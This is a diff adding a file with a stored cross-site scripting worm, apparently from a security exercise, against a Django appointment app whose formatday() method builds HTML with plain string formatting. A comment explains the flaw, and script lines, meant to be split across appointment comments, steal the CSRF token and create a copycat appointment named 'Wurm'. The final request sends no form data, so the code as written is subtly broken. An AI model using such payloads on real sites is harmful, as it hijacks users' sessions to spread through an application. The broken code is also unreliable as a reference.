@@ -1,0 +1,10 @@
+<!--
+This is the code that exploits a vulnerability which is introduced by using python string formatting
+instead of djangos format_html function in the formatday() method in utils.py.
+Each line is entered into the comment field of a separate public appointment of the same month,
+as the comments are limited in size.
+-->
+<script>var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1:8000/appointment/new/",false);x.send();var c=(new DOMParser().parseFromString(x.response, "text/html")).getElementsByName("csrfmiddlewaretoken")[0].value;</script>
+<script>var f=new FormData();f.append("csrfmiddlewaretoken",c);f.append("title","Wurm");f.append("date","2021-01-25");f.append("initial-date","2021-01-25");f.append("start_time","12:00");f.append("initial-start_time","12:00");</script>
+<script>f.append("end_time","14:00");f.append("initial-end_time","14:00");f.append("comment","Wurm drin");f.append("save","");</script>
+<script>var x=new XMLHttpRequest();x.open("POST","http://127.0.0.1:8000/appointment/new/",true);x.send();</script>
